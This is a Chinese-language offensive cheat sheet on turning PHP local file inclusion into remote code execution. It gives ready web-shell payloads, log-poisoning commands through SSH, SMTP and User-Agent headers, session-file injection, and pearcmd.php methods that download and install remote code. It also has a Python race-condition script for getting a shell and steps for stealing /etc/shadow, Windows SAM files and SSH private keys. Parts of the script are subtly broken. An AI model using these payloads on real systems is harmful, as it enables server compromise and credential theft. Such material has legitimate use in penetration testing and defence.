# 本地文件包含到远程代码执行

> LFI（本地文件包含）是一种漏洞，当Web应用程序从本地文件系统包含文件时发生，通常是由于用户输入的不安全处理引起的。如果攻击者能够控制文件路径，则可以包含敏感或危险的文件，例如系统文件（/etc/passwd）、配置文件，甚至可能导致远程代码执行（RCE）。

## 概要

- [通过/proc/*/fd进行LFI到RCE](#lfi-to-rce-via-procfd)
- [通过/proc/self/environ进行LFI到RCE](#lfi-to-rce-via-procselfenviron)
- [通过iconv进行LFI到RCE](#lfi-to-rce-via-iconv)
- [通过上传进行LFI到RCE](#lfi-to-rce-via-upload)
- [通过上传进行LFI到RCE（竞速条件）](#lfi-to-rce-via-upload-race)
- [通过上传进行LFI到RCE（FindFirstFile）](#lfi-to-rce-via-upload-findfirstfile)
- [通过phpinfo()进行LFI到RCE](#lfi-to-rce-via-phpinfo)
- [通过受控日志文件进行LFI到RCE](#lfi-to-rce-via-controlled-log-file)
    - [通过SSH进行RCE](#rce-via-ssh)
    - [通过邮件进行RCE](#rce-via-mail)
    - [通过Apache日志进行RCE](#rce-via-apache-logs)
- [通过PHP会话进行LFI到RCE](#lfi-to-rce-via-php-sessions)
- [通过PHP PEARCMD进行LFI到RCE](#lfi-to-rce-via-php-pearcmd)
- [通过凭据文件进行LFI到RCE](#lfi-to-rce-via-credentials-files)

## 通过/proc/*/fd进行LFI到RCE

1. 上传大量外壳文件（例如：100个）
2. 包含`/proc/$PID/fd/$FD`，其中`$PID`是进程ID，`$FD`是文件描述符。两者都可以暴力破解。

```ps1
http://example.com/index.php?page=/proc/$PID/fd/$FD
```

## 通过/proc/self/environ进行LFI到RCE

像日志文件一样，在`User-Agent`头中发送有效载荷，它将在`/proc/self/environ`文件中反射。

```powershell
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```

## 通过iconv进行LFI到RCE

使用iconv包装器触发glibc的OOB（CVE-2024-2961），然后使用LFI读取`/proc/self/maps`中的内存区域并下载glibc二进制文件。最后，通过利用`zend_mm_heap`结构调用被重新映射为`system`的`free()`来实现RCE。

**要求**：

- PHP 7.0.0（2015年）到8.3.7（2024年）
- GNU C库（glibc）<= 2.39
- 访问`convert.iconv`、`zlib.inflate`、`dechunk`过滤器

**利用**：

- [ambionics/cnext-exploits](https://github.com/ambionics/cnext-exploits/tree/main)

## 通过上传进行LFI到RCE

如果可以上传文件，只需在其中注入外壳有效载荷（例如：`<?php system($_GET['c']); ?>`）。

```powershell
http://example.com/index.php?page=path/to/uploaded/file.png
```

为了保持文件可读性，最好将有效载荷注入图片/文档/PDF的元数据中。

## 通过上传进行LFI到RCE（竞速条件）

- 上传一个文件并触发自我包含。
- 反复上传大量文件以：
- 提高赢得竞速的概率
- 提高猜测概率
- 暴力破解包含`/tmp/[0-9a-zA-Z]{6}`的文件
- 享受我们的外壳。

```python
import itertools
import requests
import sys

print('[+] 尝试赢得竞速')
f = {'file': open('shell.php', 'rb')}
for _ in range(4096 * 4096):
    requests.post('http://target.com/index.php?c=index.php', f)


print('[+] 暴力破解包含')
for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
    url = 'http://target.com/index.php?c=/tmp/php' + fname
    r = requests.get(url)
    if '负载平均' in r.text:  # <?php echo system('uptime');
        print('[+] 我们得到了一个外壳: ' + url)
        sys.exit(0)

print('[x] 出了点问题，请重试')
```

## 通过上传进行LFI到RCE（FindFirstFile）

:warning: 仅适用于Windows

`FindFirstFile`允许在Windows的LFI路径中使用掩码（`<<`作为`*`和`>`作为`?`）。掩码本质上是一个搜索模式，可以包含通配符字符，允许用户或开发人员根据部分名称或类型搜索文件或目录。在FindFirstFile的上下文中，掩码用于过滤和匹配文件或目录的名称。

- `*`/`<<` : 表示任意字符序列。
- `?`/`>` : 表示任意单个字符。

上传一个文件，它应该存储在临时文件夹`C:\Windows\Temp\`中，生成的名称类似于`php[A-F0-9]{4}.tmp`。
然后可以通过暴力破解65536个文件名或使用通配符字符，如：`http://site/vuln.php?inc=c:\windows\temp\php<<`

## 通过phpinfo()进行LFI到RCE

PHPinfo()显示任何变量的内容，例如**$_GET**、**$_POST**和**$_FILES**。

> 通过多次向PHPInfo脚本上传并仔细控制读取，可以检索临时文件名并在LFI脚本中指定该临时文件名。

使用脚本[phpInfoLFI.py](https://www.insomniasec.com/downloads/publications/phpinfolfi.py)

## 通过受控日志文件进行LFI到RCE

只需通过请求服务（Apache、SSH等）附加您的PHP代码到日志文件中，然后包含日志文件。

```powershell
http://example.com/index.php?page=/var/log/apache/access.log
http://example.com/index.php?page=/var/log/apache/error.log
http://example.com/index.php?page=/var/log/apache2/access.log
http://example.com/index.php?page=/var/log/apache2/error.log
http://example.com/index.php?page=/var/log/nginx/access.log
http://example.com/index.php?page=/var/log/nginx/error.log
http://example.com/index.php?page=/var/log/vsftpd.log
http://example.com/index.php?page=/var/log/sshd.log
http://example.com/index.php?page=/var/log/mail
http://example.com/index.php?page=/var/log/httpd/error_log
http://example.com/index.php?page=/usr/local/apache/log/error_log
http://example.com/index.php?page=/usr/local/apache2/log/error_log
```

### 通过SSH进行RCE

尝试使用PHP代码作为用户名登录到盒子上：`<?php system($_GET["cmd"]);?>`。

```powershell
ssh <?php system($_GET["cmd"]);?>@10.10.10.10
```

然后在Web应用程序中包含SSH日志文件。

```powershell
http://example.com/index.php?page=/var/log/auth.log&cmd=id
```

### 通过邮件进行RCE

首先使用开放的SMTP发送电子邮件，然后包含位于`http://example.com/index.php?page=/var/log/mail`的日志文件。

```powershell
root@kali:~# telnet 10.10.10.10. 25
Trying 10.10.10.10....
Connected to 10.10.10.10..
Escape character is '^]'.
220 straylight ESMTP Postfix (Debian/GNU)
helo ok
250 straylight
mail from: mail@example.com
250 2.1.0 Ok
rcpt to: root
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
subject: <?php echo system($_GET["cmd"]); ?>
data2
.
```

在某些情况下，您还可以使用`mail`命令行发送电子邮件。

```powershell
mail -s "<?php system($_GET['cmd']);?>" www-data@10.10.10.10. < /dev/null
```

### 通过Apache日志进行RCE

在访问日志中投毒用户代理：

```ps1
curl http://example.org/ -A "<?php system(\$_GET['cmd']);?>"
```

注意：日志会转义双引号，因此在PHP有效载荷中使用单引号。

然后通过LFI请求日志并执行命令。

```ps1
curl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id
```

## 通过PHP会话进行LFI到RCE

检查网站是否使用PHP会话（PHPSESSID）

```javascript
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```

在PHP中，这些会话存储在`/var/lib/php5/sess_[PHPSESSID]`或`/var/lib/php/sessions/sess_[PHPSESSID]`文件中。

```javascript
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```

设置cookie为`<?php system('cat /etc/passwd');?>`

```powershell
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```

使用LFI包含PHP会话文件

```powershell
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27
```

## 通过PHP PEARCMD进行LFI到RCE

PEAR是一个用于可重用PHP组件的框架和分发系统。默认情况下，`pearcmd.php`安装在[Docker PHP镜像](https://hub.docker.com/_/php)中的`/usr/local/lib/php/pearcmd.php`。

文件`pearcmd.php`使用`$_SERVER['argv']`获取其参数。此攻击需要在PHP配置（`php.ini`）中将`register_argc_argv`设置为`On`。

```ini
register_argc_argv = On
```

有以下几种方法可以利用它。

- **方法1**：config create

  ```ps1
  /vuln.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=eval($_GET['cmd'])?>+/tmp/exec.php
  /vuln.php?file=/tmp/exec.php&cmd=phpinfo();die();
  ```

- **方法2**：man_dir

  ```ps1
  /vuln.php?file=/usr/local/lib/php/pearcmd.php&+-c+/tmp/exec.php+-d+man_dir=<?echo(system($_GET['c']));?>+-s+
  /vuln.php?file=/tmp/exec.php&c=id
  ```

  创建的配置文件包含网络外壳。

  ```php
  #PEAR_Config 0.9
  a:2:{s:10:"__channels";a:2:{s:12:"pecl.php.net";a:0:{}s:5:"__uri";a:0:{}}s:7:"man_dir";s:29:"<?echo(system($_GET['c']));?>";}
  ```

- **方法3**：download（需要外部网络连接）。

  ```ps1
  /vuln.php?file=/usr/local/lib/php/pearcmd.php&+download+http://<ip>:<port>/exec.php
  /vuln.php?file=exec.php&c=id
  ```

- **方法4**：install（需要外部网络连接）。注意`exec.php`位于`/tmp/pear/download/exec.php`。

  ```ps1
  /vuln.php?file=/usr/local/lib/php/pearcmd.php&+install+http://<ip>:<port>/exec.php
  /vuln.php?file=/tmp/pear/download/exec.php&c=id
  ```

## 通过凭据文件进行LFI到RCE

此方法需要在应用程序内具有高权限才能读取敏感文件。

### Windows版本

提取`sam`和`system`文件。

```powershell
http://example.com/index.php?page=../../../../../../WINDOWS/repair/sam
http://example.com/index.php?page=../../../../../../WINDOWS/repair/system
```

然后从这些文件中提取哈希`samdump2 SYSTEM SAM > hashes.txt`，并使用`hashcat/john`破解它们，或者使用Pass The Hash技术重放它们。

### Linux版本

提取`/etc/shadow`文件。

```powershell
http://example.com/index.php?page=../../../../../../etc/shadow
```

然后破解内部的哈希以便通过SSH登录到机器上。

另一种通过LFI获得Linux机器SSH访问的方法是读取私有SSH密钥文件：`id_rsa`。
如果SSH已激活，通过包含`/etc/passwd`的内容检查机器上使用的用户，并尝试访问`/<HOME>/.ssh/id_rsa`以供每个拥有家目录的用户使用。

## 参考文献

- [LFI WITH PHPINFO() ASSISTANCE - Brett Moore - September 2011](https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf)
- [LFI2RCE via PHP Filters - HackTricks - July 19, 2024](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters)
- [Local file inclusion tricks - Johan Adriaans - August 4, 2007](http://devels-playground.blogspot.fr/2007/08/local-file-inclusion-tricks.html)
- [PHP LFI to arbitrary code execution via rfc1867 file upload temporary files (EN) - Gynvael Coldwind - March 18, 2011](https://gynvael.coldwind.pl/?id=376)
- [PHP LFI with Nginx Assistance - Bruno Bierbaumer - 26 Dec 2021](https://bierbaumer.net/security/php-lfi-with-nginx-assistance/)
- [Upgrade from LFI to RCE via PHP Sessions - Reiners - September 14, 2017](https://web.archive.org/web/20170914211708/https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions/)